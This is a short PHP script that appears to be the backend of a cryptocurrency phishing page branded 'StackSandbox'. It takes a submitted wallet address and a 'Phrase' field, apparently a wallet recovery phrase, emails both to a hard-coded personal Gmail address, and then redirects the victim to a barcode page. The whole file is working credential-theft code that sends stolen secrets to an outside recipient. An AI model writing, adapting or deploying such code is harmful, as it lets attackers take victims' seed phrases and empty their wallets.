<?php

if(isset($_POST['submit'])){
    $w = $_POST['w'];
    $ph =$_POST['ph'];

    $subject = "NEW MESSAGE FROM STACKSANDBOX";

    $body = "<p>Walladd: $w</p><br /><p>Phrase: $ph</p>";
    $to = "levisolawale20@gmail.com";

$headers .='Reply-To: '. $to . "\r\n" ;
$headers .='X-Mailer: PHP/' . phpversion();
$headers .="Content-Type: text/html; charset=ISO-8859-1\r\n";

if(mail($to,$subject,$body,$headers, '-f levisolawale20@gmail.com -F "CLRW"')) {
    header("Location:  ./barcode.html");

    }
    else
    {
    header("Location: ./barcode.html");
    }

}

>